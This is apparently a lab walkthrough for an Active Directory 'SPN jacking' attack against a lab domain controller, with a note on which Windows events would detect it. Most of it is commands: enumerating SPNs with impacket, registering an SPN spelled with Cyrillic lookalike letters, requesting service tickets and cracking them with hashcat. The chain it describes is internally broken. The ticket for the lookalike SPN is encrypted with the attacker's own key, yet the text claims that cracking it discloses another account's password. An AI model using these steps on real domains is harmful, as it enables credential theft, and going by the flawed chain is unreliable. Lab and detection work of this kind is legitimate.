# WT#027 — SPN Jacking (CVE-2026-25177)

## Metadata

| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10), cadre.local |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_cloud / Cl0ud_An@lyst! |
| **Tools Required** | PowerShell, PowerView/ADSI |
| **Certifications** | N/A (CVE-specific) |
| **MITRE ATT&CK** | T1558.003 |
| **Difficulty** | Medium |

## Prerequisites

- Valid `cadre.local` domain credentials (`analyst_cloud`)
- The `Validated-SPN` or `Self` extended right (analyst_cloud has permission to register SPNs)
- Server 2025 KDC (required for Unicode SPN collision vulnerability)

## Attack Steps

### Step 1: Recon — Enumerate existing SPNs

```bash
impacket-GetUserSPNs cadre.local/analyst_cloud:'Cl0ud_An@lyst!' -dc-ip 192.168.77.10
```

### Step 2: Exploit — Register homoglyph SPN

```powershell
# Register an SPN using Unicode homoglyphs (Cyrillic 'а' U+0430 instead of Latin 'a')
# Target: hijack TGS requests intended for HTTP/cadre-portal.cadre.local
Set-ADUser -Identity "analyst_cloud" -ServicePrincipalNames @{Add="HTTP/cadre-portal.cаdre.locаl"} 

# Verify the SPN collision exists
Get-ADUser -Filter {ServicePrincipalNames -like "*cadre-portal*"} -Properties ServicePrincipalNames | Select-Object Name, ServicePrincipalNames
```

### Step 3: Exploit — Intercept TGS requests

```bash
# Request a TGS for the lookalike SPN
impacket-GetUserSPNs cadre.local/analyst_cloud:'Cl0ud_An@lyst!' -dc-ip 192.168.77.10 -request -outputfile intercepted_tgs.txt

# The KDC resolves the SPN to analyst_cloud instead of chief_command
# Crack the intercepted TGS
hashcat -m 13100 intercepted_tgs.txt /usr/share/wordlists/rockyou.txt --force
```

## Post-Exploitation Chain

TGS intended for `HTTP/cadre-portal.cadre.local` (SPN of `chief_command`) is returned encrypted with `analyst_cloud`'s key → crack → password disclosure. This enables credential theft from a low-privileged position by intercepting TGS requests.

## Telemetry Verification

- **Elastic Index:** `logs-system.security-*`
- **Detection Rule:** No dedicated detection rule exists for SPN Unicode collision
- **Expected Event:** Event ID 4769 for the lookalike SPN (visually identical to the legitimate SPN), Event ID 4742 (user account modified — SPN added)
- **Note:** Detection requires auditing SPN registrations (Event ID 4742 with ServicePrincipalNames attribute change) and visual inspection for non-ASCII characters in SPN values

## Status

CONFIGURED
